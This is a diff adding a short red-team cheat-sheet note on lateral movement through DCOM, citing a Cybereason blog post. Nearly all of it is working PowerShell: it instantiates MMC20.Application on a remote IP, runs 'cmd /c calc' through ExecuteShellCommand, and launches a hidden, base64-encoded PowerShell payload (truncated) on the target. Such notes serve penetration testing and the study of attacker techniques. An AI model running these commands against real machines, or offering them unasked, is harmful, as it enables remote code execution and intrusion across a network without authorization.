@@ -1,0 +1,13 @@
+https://www.cybereason.com/blog/dcom-lateral-movement-techniques
+
+Distributed Component Object Model (DCOM)
+RPC on TCP port 135
+
+# Admin PS, iniciate a MMC2.0 remote in the IP:
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.3"))
+
+# Execute command with Command, Directory, Parameters, and WindowState (cmd /c calc):
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+# Executin a Base64 powershell payload:
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABj...QAoACkA","7")
